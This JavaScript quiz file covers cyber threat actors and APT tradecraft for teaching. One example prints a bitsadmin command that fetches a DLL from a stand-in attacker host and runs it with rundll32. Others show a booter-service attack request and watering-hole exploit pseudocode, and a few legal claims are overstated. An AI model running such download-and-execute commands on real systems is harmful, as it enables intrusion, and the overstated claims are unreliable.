const questions = [
  {
    question: "What is an 'Advanced Persistent Threat' (APT), and what distinguishes it from opportunistic cyber criminals or script kiddies?",
    shortAnswer: "APTs are highly sophisticated, well-funded threat actors (typically state-sponsored) who conduct stealthy, continuous, multi-year cyber espionage campaigns against specific high-value targets.",
    explanation: "Unlike script kiddies who run noisy automated scanners or ransomware cartels seeking quick ransom payouts, APTs (e.g., APT28, APT29, APT41, Lazarus Group) are backed by national intelligence agencies. They possess virtually unlimited budgets, custom zero-day exploit arsenals, and maintain multi-year persistence ('dwell time') inside government, military, defense contractor, and critical infrastructure networks without being detected.",
    hint: "Think about nation-state sponsored hacking units with multi-million dollar budgets and multi-year persistence.",
    level: "basic",
    codeExample: `// APT Operational Profile:
Sponsorship: Nation-State Military / Intelligence Agency (e.g., Russia, China, North Korea)
Objective:   Long-term Strategic Espionage, Critical Infrastructure Pre-positioning, Cyber Warfare
Dwell Time:  Months to Years (Stealthy C2 beacons, Living-off-the-Land, Custom Rootkits)`
  },
  {
    question: "What are 'Hacktivists', and what are their primary motivations and typical attack vectors?",
    shortAnswer: "Individuals or collectives driven by political, social, or ideological causes who use website defacements, DDoS attacks, and data leaks to publicize their message.",
    explanation: "Hacktivists (e.g., Anonymous, Syrian Electronic Army, LulzSec) hack not for personal financial enrichment or military sabotage, but to draw global public attention to political corruption, human rights violations, or corporate misconduct. Their primary tactics include volumetric DDoS attacks (using tools like LOIC/HOIC to take down government websites), website defacements, and dumping leaked confidential emails onto Pastebin or Telegram.",
    hint: "Think of groups like Anonymous who hack for political or social causes rather than monetary profit.",
    level: "basic",
    codeExample: `// Hacktivist Threat Vector Profile:
Motivation: Ideological Protest, Anti-Corruption, Freedom of Information
Primary Tools: LOIC (Low Orbit Ion Cannon), Slowloris, Pastebin / Telegram Dumps
Impact: High Public Visibility, Reputational Damage, Website Downtime (Low Technical Novelty)`
  },
  {
    question: "What is a 'Script Kiddie', and why can they still pose a serious operational risk to enterprise networks despite their low technical skills?",
    shortAnswer: "Inexperienced individuals who use pre-written scripts and automated tools without understanding how they work; dangerous because automated tools can cause severe accidental data corruption or find low-hanging unpatched servers.",
    explanation: "Script kiddies lack deep knowledge of programming, networking, or kernel architecture. They download pre-compiled exploits, cracked Remote Access Trojans (RATs), and automated scanners (like Masscan or automated SQLi tools). Despite their low skill, they present a constant background threat because they indiscriminately scan millions of public IP addresses, rapidly discovering unpatched, internet-facing servers with default credentials.",
    hint: "Think about novice hackers who copy and run other people's automated attack tools.",
    level: "basic",
    codeExample: `// Script Kiddie Attack Pattern:
Tool: Downloaded "Auto-SQLi-Scanner.exe" from Discord / YouTube
Action: Ingests 50,000 public Google Dorks → Blasts automated SQL payloads indiscriminately
Risk: Can accidentally crash production databases or wipe tables via malformed payloads.`
  },
  {
    question: "What is the 'Lazarus Group' (APT38 / Hidden Cobra), and how did they innovate state-sponsored cybercrime to fund national weapons programs?",
    shortAnswer: "A North Korean state-sponsored threat group that executes massive financial heists (e.g., 2016 Bangladesh Bank $81M SWIFT hack, 2022 Axie Infinity ₹5,000 Cr crypto theft, 2017 WannaCry).",
    explanation: "Unlike Western and Russian APTs that focus primarily on geopolitical espionage and intelligence gathering, North Korea's Lazarus Group operates as a state-sanctioned financial crime syndicate. Under extreme international economic sanctions, the group is tasked with generating billions of dollars in foreign currency by breaching central bank SWIFT gateways, deploying ransomware (WannaCry), and executing massive cross-chain cryptocurrency bridge hacks.",
    hint: "Recall the state-sponsored North Korean hacking group famous for the Bangladesh Bank SWIFT heist and crypto bridge thefts.",
    level: "moderate",
    codeExample: `// Lazarus Group Financial Heists:
2016: Bangladesh Bank SWIFT Heist → ₹650 Crores ($81M stolen via fake wire transfers)
2017: WannaCry Global Ransomware   → 200,000 systems encrypted worldwide
2022: Ronin Network (Axie Infinity) → ₹5,000 Crores ($620M) cryptocurrency stolen in one transaction`
  },
  {
    question: "What is the 'Diamond Model of Intrusion Analysis', and what are its four core interconnected vertices?",
    shortAnswer: "A framework that models every cyber intrusion event as a relationship between: 1. Adversary, 2. Capability, 3. Infrastructure, and 4. Victim.",
    explanation: "Created by Sergio Caltagirone, Andrew Pendergast, and Christopher Betz, the Diamond Model provides a formal scientific method for threat intelligence analysts. Every intrusion event links: 1. The Adversary (who is attacking); 2. The Capability (what tools/malware are used); 3. The Infrastructure (what C2 servers/domains are used); and 4. The Victim (who is targeted). Analysts pivot across vertices to uncover threat actor campaigns.",
    hint: "Remember the 4 vertices of the diamond: Adversary, Capability, Infrastructure, and Victim.",
    level: "expert",
    codeExample: `// Diamond Model Structure:
           [ ADVERSARY ] (e.g., Lazarus Group)
               /     \\
              /       \\
[ CAPABILITY ] ------- [ INFRASTRUCTURE ]
(Custom Swift Malware)  (Compromised VPS Nodes)
              \\       /
               \\     /
            [ VICTIM ] (e.g., Regional Bank in Kolkata)`
  },
  {
    question: "What is 'Volt Typhoon' (2023-2024), and why is their 'Pre-positioning' strategy against critical national infrastructure uniquely alarming?",
    shortAnswer: "A Chinese state-sponsored APT that compromises critical infrastructure routers to maintain silent access for future sabotage during geopolitical conflicts, without executing immediate data theft.",
    explanation: "Identified by CISA, NSA, and Microsoft, Volt Typhoon targets water treatment facilities, electricity transmission grids, and transportation ports. Rather than stealing data or deploying ransomware, Volt Typhoon practices 'Pre-positioning': establishing deep, stealthy footholds using Living-off-the-Land (LotL) commands on edge routers (Fortinet, Cisco). Their objective is to remain dormant until instructed to execute physical cyber-kinetic grid disruption during military conflicts.",
    hint: "Think about state-sponsored hackers hiding inside power and water grids to sabotage them if a war starts in the future.",
    level: "expert",
    codeExample: `// Volt Typhoon Operational Tradecraft:
Objective: Pre-positioning for future cyber warfare (Grid sabotage)
Tradecraft: 100% Living-off-the-Land (Zero custom malware binaries on disk)
Targets: SOHO Routers (Netgear, Cisco) used as obfuscated proxy networks`
  },
  {
    question: "How does an 'Insider Threat' differ from an external threat actor, and what are the two main sub-types (Malicious vs Negligent)?",
    shortAnswer: "Insiders already possess legitimate authenticated access and physical credentials; Malicious insiders intentionally steal or sabotage data, while Negligent insiders accidentally expose data through carelessness.",
    explanation: "Insiders bypass all external firewalls, VPNs, and perimeter guards because they are authorized employees or contractors. 1. Malicious Insiders (e.g., a disgruntled engineer stealing trade secrets before quitting or accepting bribes to plant ransomware); 2. Negligent Insiders (e.g., an employee uploading a database containing 50,000 patient records to an unencrypted public AWS S3 bucket by mistake).",
    hint: "Compare an employee intentionally stealing data for money versus an employee accidentally leaving a database unlocked.",
    level: "basic",
    codeExample: `// Insider Threat Taxonomy:
Malicious Insider: Disgruntled admin sells corporate database on Telegram for ₹15 Lakhs.
Negligent Insider: Junior developer commits AWS Root API keys to a public GitHub repository.`
  },
  {
    question: "What was 'LulzSec' (2011), and how did their 50-day hacking spree transform hacktivism and law enforcement cyber investigations?",
    shortAnswer: "A high-profile splinter group of Anonymous that breached Sony, PBS, CIA.gov, and the US Senate for 'lulz' (entertainment) before their leader Sabu became an FBI informant.",
    explanation: "Led by Hector Monsegur ('Sabu') and Mustafa Al-Bassam ('tflow'), LulzSec spent 50 days in 2011 executing high-profile breaches across entertainment giants, game networks, and government agencies, publishing stolen databases and mocking victims on Twitter. After the FBI arrested Sabu, he worked undercover as a confidential informant, leading to the synchronized global arrests of key members across the UK, US, and Ireland.",
    hint: "Recall the famous 2011 hacktivist group led by Sabu that hacked Sony and CIA.gov for amusement.",
    level: "moderate",
    codeExample: `// LulzSec 50-Day Campaign Timeline (2011):
Day 01: Compromised Fox.com employee database
Day 15: Breached Sony Pictures → Leaked 1,000,000 user passwords in cleartext
Day 25: DDoS attack taking down CIA.gov
Day 50: Released final data dump and disbanded; Sabu later unmasked by FBI`
  },
  {
    question: "What is 'DDoS-for-Hire' (Booter / Stresser services), and how do script kiddies utilize them to launch multi-gigabit attacks for cheap fees?",
    shortAnswer: "Web-based subscription platforms that rent out access to massive botnets, allowing non-technical users to launch volumetric DDoS attacks by entering an IP address and paying ₹800.",
    explanation: "Booter and Stresser services disguise themselves as 'network load-testing tools' but operate as commercial DDoS platforms. Script kiddies pay ₹800 to ₹4,000 via cryptocurrency or PayPal, select a target IP address (such as a school exam portal or rival gaming server), and trigger synchronized amplification attacks (NTP, DNS, SSDP reflection) reaching 50 to 500+ Gbps without writing a single line of code.",
    hint: "Think about websites where teenagers pay a few dollars to take down gaming servers or school websites with DDoS attacks.",
    level: "basic",
    codeExample: `// Booter / Stresser Web Interface API (Educational Placeholder):
POST https://attacker-stresser.net/api/attack
{
    "target_ip": "192.0.2.1",
    "port": 80,
    "duration_seconds": 300,
    "method": "NTP_AMPLIFICATION" // Multiplies traffic 556x
}`
  },
  {
    question: "How do 'Threat Intelligence Feeds' and 'STIX/TAXII' standards help enterprise SOCs track and block nation-state APT campaigns?",
    shortAnswer: "STIX provides a standardized language to describe threat actor TTPs, malware, and IOCs; TAXII provides the automated protocol to exchange this intelligence in real time across SIEMs.",
    explanation: "Structured Threat Information Expression (STIX) models threat intelligence (threat actors, attack patterns, indicators, vulnerabilities). Trusted Automated Exchange of Intelligence Information (TAXII) is the secure application-layer protocol used to transport STIX data over HTTPS. This allows an enterprise SOC in Kolkata to automatically ingest live threat indicators of an ongoing APT campaign and block malicious domains on firewalls within milliseconds of discovery.",
    hint: "Remember STIX for formatting threat data and TAXII for transporting threat data between security systems.",
    level: "expert",
    codeExample: `// STIX 2.1 Threat Indicator JSON:
{
  "type": "indicator",
  "id": "indicator--8e2e28ce-33e5-4c00-a443-bf05d970f890",
  "name": "Threat Actor C2 Domain Indicator",
  "pattern": "[domain-name:value = 'attacker-c2.net']",
  "pattern_type": "stix",
  "valid_from": "2026-08-23T00:00:00Z"
}`
  },
  {
    question: "What is 'Fast-Flux DNS' and 'Domain Fronting', and how do APT threat actors use these techniques to hide their Command-and-Control infrastructure?",
    shortAnswer: "Fast-Flux rotates hundreds of IP addresses for a single domain name every few minutes; Domain Fronting hides malicious C2 destinations behind trusted CDNs (like Cloudflare or CloudFront).",
    explanation: "To prevent defenders from blocking C2 servers by IP address, APTs use Fast-Flux DNS, rapidly changing the `A` record DNS responses every 60-300 seconds using a pool of thousands of compromised bot proxies. In Domain Fronting, the malware sends HTTPS requests using a legitimate, highly trusted domain (e.g., `ajax.microsoft.com`) in the SNI header, but routes to the hidden attacker C2 server inside the encrypted HTTP `Host` header via the shared CDN.",
    hint: "Think about constantly changing IP addresses every minute or hiding behind trusted Google/Microsoft CDN domains.",
    level: "expert",
    codeExample: `// Domain Fronting Request Structure:
TLS SNI Header (Visible to Firewall):   "d1234.cloudfront.net" (Trusted AWS CDN)
Encrypted HTTP Host Header (To CDN):    "Host: attacker-c2.net" (Routes secretly to attacker C2)`
  },
  {
    question: "What are 'Cyber Mercenaries' and 'Commercial Spyware Vendors' (e.g., NSO Group / Pegasus), and what category of threat actor do they represent?",
    shortAnswer: "Private commercial corporations that develop military-grade zero-click surveillance exploits and sell them to governments, operating as private-sector APTs.",
    explanation: "Companies like NSO Group (Pegasus), Candiru, and Intellexa represent a dangerous hybrid threat actor. They employ world-class reverse engineers to discover zero-click zero-days in iOS, Android, and WhatsApp (requiring zero victim interaction). While marketed to law enforcement for anti-terrorism, their spyware is frequently weaponized against investigative journalists, opposition politicians, and human rights defenders worldwide.",
    hint: "Recall the private surveillance companies like NSO Group that sell the Pegasus zero-click spyware to governments.",
    level: "moderate",
    codeExample: `// Pegasus Zero-Click Infection Vector (e.g., FORCEDENTRY):
Attacker sends invisible iMessage containing malicious PDF / JBIG2 image → 
Integer overflow in CoreGraphics parses font → Remote Code Execution with Root privileges (Zero clicks required)`
  },
  {
    question: "Under the Indian IT Act 2000, how does Section 66F specifically target Nation-State and Terrorist Threat Actors?",
    shortAnswer: "It classifies cyber attacks intended to threaten the unity, integrity, security, or sovereignty of India or disrupt critical infrastructure as Cyber Terrorism, punishing offenders with Life Imprisonment.",
    explanation: "Section 66F is the primary statutory weapon against state-sponsored actors and cyber terrorists. It penalizes any person who denies authorized access to critical computer resources, accesses classified military/defense networks without authorization, or introduces contaminants to cause death, injury, or national economic damage. It carries mandatory non-bailable Life Imprisonment.",
    hint: "Remember the Indian legal statute that imposes life imprisonment for state-sponsored cyber terrorism and power grid sabotage.",
    level: "basic",
    codeExample: `// IT Act Section 66F Applicability:
Target: National Critical Information Infrastructure (Power, Defense, Nuclear, Banking)
Offense: Cyber Terrorism / State-Sponsored Sabotage
Statutory Penalty: LIFE IMPRISONMENT (Non-Bailable Offense under Indian Cyber Law)`
  },
  {
    question: "What is 'Credential Dumping via LSASS Injection', and why is it a universal TTP across both APTs and Ransomware Affiliates?",
    shortAnswer: "Extracting plaintext passwords, NTLM hashes, and Kerberos tickets cached in the memory of the Windows Local Security Authority Subsystem Service (lsass.exe).",
    explanation: "When a user logs into a Windows workstation or server, the operating system caches their credentials in the memory space of `lsass.exe` to enable Single Sign-On (SSO). Threat actors with local administrator rights inject into or dump LSASS memory (using Mimikatz, ProcDump, or comsvcs.dll), stealing cached domain administrator credentials and enabling rapid lateral movement across the entire enterprise network.",
    hint: "Think about dumping the Windows memory process that holds logged-in users' passwords and Kerberos tickets.",
    level: "expert",
    codeExample: `// LSASS Protection Telemetry Verification (PowerShell):
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard
// Verification: Confirms Credential Guard and Virtualization-Based Security (VBS) are ACTIVE.`
  },
  {
    question: "What is 'Social Engineering Pretexting' by Nation-State APTs targeting defense and aerospace engineers on LinkedIn?",
    shortAnswer: "Creating fake recruiter personas from top aerospace/defense firms to lure target engineers into opening weaponized PDF job descriptions containing backdoor malware.",
    explanation: "Threat actors like Lazarus Group (Operation Dream Job) create highly convincing fake LinkedIn profiles of executive recruiters from Boeing, Lockheed Martin, or ISRO. They contact target aerospace propulsion engineers, offer fictitious high-paying dream jobs, and send a 'Job_Description.pdf.exe' or a weaponized Word document containing macro shellcode, gaining an initial foothold into the defense contractor's internal workstation network.",
    hint: "Think of fake recruiters offering lucrative fake jobs to trick aerospace engineers into opening infected files.",
    level: "moderate",
    codeExample: `// Operation Dream Job Pretexting Workflow:
1. Attacker creates fake LinkedIn profile: "Senior Talent Lead @ Premier Defense Aerospace".
2. Contacts engineer: "We are offering a ₹60 Lakhs/yr Chief Propulsion Engineer role."
3. Sends: "Aerospace_Salary_Breakdown.docx" containing CVE-2021-40444 exploit → Backdoor deployed.`
  },
  {
    question: "How do 'Watering Hole Attacks' by APTs differ from generic malicious spam campaigns?",
    shortAnswer: "Spam is blasted indiscriminately to millions; Watering Hole attacks compromise specific niche websites visited exclusively by the targeted demographic (e.g., defense forums).",
    explanation: "While spam and mass phishing cast a wide, indiscriminate net, a Watering Hole attack is surgical. The APT identifies websites frequently visited by target engineers (e.g., regional civil aviation forums, power grid equipment portals, or specialized government suppliers). They compromise that single website, injecting zero-day browser exploits that selectively execute only if the visitor's IP address matches the target organization's CIDR block.",
    hint: "Contrast blasting millions of spam emails versus selectively infecting only people who visit a specific defense industry website.",
    level: "moderate",
    codeExample: `// Watering Hole IP Filtering Rule:
if (visitor_ip.in_range("203.0.113.0/24") == True) { // Belongs to Nuclear Research Facility
    trigger_zero_day_browser_exploit();
} else {
    serve_normal_webpage(); // Remains hidden from public security scanners!
}`
  },
  {
    question: "What is 'Living off the Land' (LotL) in the context of APT stealth operations?",
    shortAnswer: "Using legitimate native operating system administrative tools (LOLBins like PowerShell, WMI, Certutil, Bitsadmin) to perform malicious actions without compiling custom malware to disk.",
    explanation: "Writing custom binary files (`malware.exe`) to disk generates telemetry that modern Endpoint Detection and Response (EDR) agents detect. Nation-state APTs execute their entire attack chain in memory using trusted, pre-installed Windows tools: `bitsadmin.exe` to download files, `wmic.exe` to execute lateral commands, and `powershell.exe` to inject shellcode directly into RAM, leaving zero file-based forensics for antivirus.",
    hint: "Think about using the computer's own built-in tools against itself rather than downloading foreign software.",
    level: "basic",
    codeExample: `// Living off the Land (LOLBin) Download via Bitsadmin:
bitsadmin.exe /transfer myDownloadJob /download /priority high http://apt-c2.net/stage2.dll C:\\Windows\\Temp\\stage2.dll
rundll32.exe C:\\Windows\\Temp\\stage2.dll, EntryPoint`
  },
  {
    question: "What was 'Stuxnet' (2010), and why is it considered the foundational milestone of military-grade Nation-State cyber warfare?",
    shortAnswer: "A joint US-Israeli cyber weapon that crossed the digital-physical divide, using 4 zero-days to manipulate Siemens PLCs and physically destroy Iranian nuclear centrifuges at Natanz.",
    explanation: "Discovered in 2010, Stuxnet proved that computer malware could physically destroy heavy industrial machinery. It crossed an air-gapped facility via infected USB flash drives, utilized four Microsoft Windows zero-day exploits, and stealthily reprogrammed Siemens S7-300 Programmable Logic Controllers (PLCs), causing uranium enrichment centrifuges to spin at destructive supersonic speeds while reporting normal telemetry to human operators.",
    hint: "Recall the malware that crossed the digital-physical barrier to physically destroy uranium centrifuges.",
    level: "basic",
    codeExample: `// Stuxnet Kinetic Sabotage Mechanics:
Normal Centrifuge Speed: 1,064 Hz
Stuxnet Attack Sequence:
1. Spike rotor frequency to 1,410 Hz for 15 minutes (Causes physical metal fatigue).
2. Drop rotor frequency to 2 Hz for 50 minutes (Causes harmonic vibration damage).
3. Spoof SCADA telemetry: Send fake "1,064 Hz Normal" signal to human operators' monitoring screens.`
  },
  {
    question: "What is 'Hacktivist Doxxing', and what legal remedies exist under the Indian Information Technology Act and DPDP Act 2023?",
    shortAnswer: "Publicly broadcasting an individual's private personal information (home address, phone number, Aadhaar) to encourage harassment; penalized under IT Act Section 66E (Privacy violation) and DPDP Act 2023.",
    explanation: "Doxxing is a common hacktivist tactic where personal identity records of political figures, corporate executives, or law enforcement officers are published online to incite public harassment or vigilantism. Under Section 66E of the IT Act 2000, publishing private personal records without consent carries up to 3 years imprisonment. Under the DPDP Act 2023, organizations responsible for leaking such personal data face statutory penalties up to ₹250 Crores.",
    hint: "Think about publishing someone's private home address and phone number online to cause harassment.",
    level: "moderate",
    codeExample: `// Doxxing Legal Penalties in India:
IT Act 2000 Section 66E: Privacy Violation / Leaking Personal Data → Up to 3 Years Imprisonment
DPDP Act 2023 Section 33: Data Fiduciary Breach Penalty → Up to ₹250 Crores`
  },
  {
    question: "Synthesizing the entire Threat Actor spectrum: why is threat attribution one of the most difficult challenges in modern cyber intelligence?",
    shortAnswer: "Because sophisticated adversaries use false-flag operations, multi-hop proxy networks, stolen tools, and spoofed language timestamps to deliberately mislead forensic investigators.",
    explanation: "Attributing an attack to a specific foreign intelligence service is extraordinarily difficult. Threat actors utilize multi-layered anonymity networks, operate through compromised home routers (Volt Typhoon), purposefully compile their malware during the working hours of rival countries, and insert Russian or Chinese language strings ('False Flags') into their code to deceive threat intelligence analysts. Attribution requires correlating digital forensics with human intelligence (HUMINT) and signals intelligence (SIGINT).",
    hint: "Conclude by recognizing that elite attackers actively plant fake clues (false flags) to make investigators blame someone else.",
    level: "expert",
    codeExample: `// False Flag Attribution Deception Example:
Attacker: Iranian APT group
Tactic: Inserts Russian language Cyrillic strings into malware binary and sets compile timestamp to Moscow Standard Time (UTC+3) to mislead forensic investigators into blaming Russian APT28.`
  }
];

export default questions;
